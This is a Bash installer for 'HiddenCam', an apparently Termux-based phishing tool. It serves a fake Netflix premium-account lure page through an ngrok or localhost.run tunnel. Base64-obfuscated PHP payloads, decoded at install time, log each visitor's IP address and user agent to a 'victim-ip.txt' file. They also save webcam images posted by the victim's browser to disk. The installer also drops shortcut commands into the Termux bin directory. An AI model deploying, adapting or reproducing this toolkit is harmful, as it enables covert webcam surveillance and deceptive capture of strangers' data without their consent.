#!/bin/bash

banner() {

clear
printf "\e[1;33m  _    _ _     _     _             \e[1;32m  _____                 \e[0m\n"
printf "\e[1;33m | |  | (_)   | |   | |            \e[1;32m / ____|                \e[0m\n"
printf "\e[1;33m | |__| |_  __| | __| | ___ _ __   \e[1;32m| |     __ _ _ __ ___   \e[0m\n"
printf "\e[1;33m |  __  | |/ _  |/ _  |/ _ \  _ \  \e[1;32m| |    / _  |  _   _ \  \e[0m\n"
printf "\e[1;33m | |  | | | (_| | (_| |  __/ | | | \e[1;32m| |___| (_| | | | | | | \e[0m\n"
printf "\e[1;33m |_|  |_|_|\__,_|\__,_|\___|_| |_| \e[1;32m \_____\__,_|_| |_| |_| \e[0m\n"
printf " \n"
printf "\e[0m\e[1;93m           Tool Created By thelinuxchoice \e[0m\n"
printf " \n"
printf "\e[0m\e[1;93m    Created By HTR-TECH \e[0m\e[1;91m(\e[0m\e[1;92mTahmid Rayat\e[0m\e[1;91m)\e[0m\n"

}
banner
printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installing Packages...\e[0m\n"
printf " \n"
pkg install curl php python2 openssh unzip -y

if [[ -e .www ]]; then
echo ""
else
mkdir .www
fi

if [[ -e images ]]; then
echo ""
else
mkdir images
fi

# Create Files

if [[ -e ~/.ssh/known_hosts ]]; then
echo ""
else
printf "ssh.localhost.run,35.193.161.204 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n" > ~/.ssh/known_hosts
fi

if [[ -e .www/main.php ]]; then
echo ""
else
printf "<?php\ninclude '.camdata.php';\nheader('Location: forwarding_link/NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/main.php
fi

if [[ -e .www/.camdata.php ]]; then
echo ""
else
printf "<?php\n  " > .www/.log1.php
printf "$" >> .www/.log1.php
printf "str = 'PD9waHAKCmlmICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKQogICAgewogICAgICAkaXBhZGRyZXNzID0gJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10uIlxyXG4iOwogICAgfQplbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpCiAgICB7CiAgICAgICRpcGFkZHJlc3MgPSAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXS4iXHJcbiI7CiAgICB9CmVsc2UKICAgIHsKICAgICAgJGlwYWRkcmVzcyA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddLiJcclxuIjsKICAgIH0KJHVzZXJhZ2VudCA9ICIgVXNlci1BZ2VudDogIjsKJGJyb3dzZXIgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiRzcGFjZSA9ICJcclxuIjsKCgokZmlsZSA9ICcuLi92aWN0aW0taXAudHh0JzsKJHZpY3RpbSA9ICJJUDogIjsKJGZwID0gZm9wZW4oJGZpbGUsICdhJyk7Cgpmd3JpdGUoJGZwLCAkdmljdGltKTsKZndyaXRlKCRmcCwgJGlwYWRkcmVzcyk7CmZ3cml0ZSgkZnAsICR1c2VyYWdlbnQpOwpmd3JpdGUoJGZwLCAkYnJvd3Nlcik7CmZ3cml0ZSgkZnAsICRzcGFjZSk7CgpmY2xvc2UoJGZwKTs=';\n  echo base64_decode(" >> .www/.log1.php
printf "$" >> .www/.log1.php
printf "str);\n?>" >> .www/.log1.php
php .www/.log1.php > .www/.camdata.php
rm -rf .www/.log1.php
fi

if [[ -e .www/.htrtech.php ]]; then
echo ""
else
printf "<?php\n  " > .www/.log2.php
printf "$" >> .www/.log2.php
printf "str = 'PD9waHAKCiRkYXRlID0gZGF0ZSgnaV9zX0gtZE1ZJyk7CiRpbWFnZURhdGE9JF9QT1NUWydjYXQnXTsKCmlmICghZW1wdHkoJF9QT1NUWydjYXQnXSkpIHsKZXJyb3JfbG9nKCJSZWNlaXZlZCIgLiAiXHJcbiIsIDMsICIuY2FtLmxvZyIpOwoKfQoKJGZpbHRlcmVkRGF0YT1zdWJzdHIoJGltYWdlRGF0YSwgc3RycG9zKCRpbWFnZURhdGEsICIsIikrMSk7CiR1bmVuY29kZWREYXRhPWJhc2U2NF9kZWNvZGUoJGZpbHRlcmVkRGF0YSk7CiRmcCA9IGZvcGVuKCAnLi4vaW1hZ2VzL0hpZGRlbkNhbS0nLiRkYXRlLicucG5nJywgJ3diJyApOwpmd3JpdGUoICRmcCwgJHVuZW5jb2RlZERhdGEpOwpmY2xvc2UoICRmcCApOwoKZXhpdCgpOwo/Pg==';\n  echo base64_decode(" >> .www/.log2.php
printf "$" >> .www/.log2.php
printf "str);\n?>" >> .www/.log2.php
php .www/.log2.php > .www/.htrtech.php
rm -rf .www/.log2.php
fi

if [[ -e .www/main.html ]]; then
echo ""
else
mv .log3.log .www/main.html
fi

echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/htr-tech
echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/HTR-TECH
echo 'termux-open-url https://www.instagram.com/tahmid.rayat/' > /data/data/com.termux/files/usr/bin/instagram
echo 'termux-open-url https://www.instagram.com/tahmid.rayat/' > /data/data/com.termux/files/usr/bin/Instagram
chmod +x /data/data/com.termux/files/usr/bin/htr-tech
chmod +x /data/data/com.termux/files/usr/bin/HTR-TECH
chmod +x /data/data/com.termux/files/usr/bin/instagram
chmod +x /data/data/com.termux/files/usr/bin/Instagram


banner
printf " \n"
printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Initializing...\e[0m\n"

if [[ -e .www/ngrok ]]; then
echo ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -o ngrok-stable-linux-arm.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip -d .www > /dev/null 2>&1
chmod +x .www/ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi

else
curl -o ngrok-stable-linux-386.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip -d .www > /dev/null 2>&1
chmod +x .www/ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi

printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installation Completed ...\e[0m\n"
printf " \n"
printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;96m Type \e[1;93mbash hiddencam \e[1;96mto run this tool\e[0m\n"
sleep 2
printf "\e[0m\n"
printf "\e[0m\n"
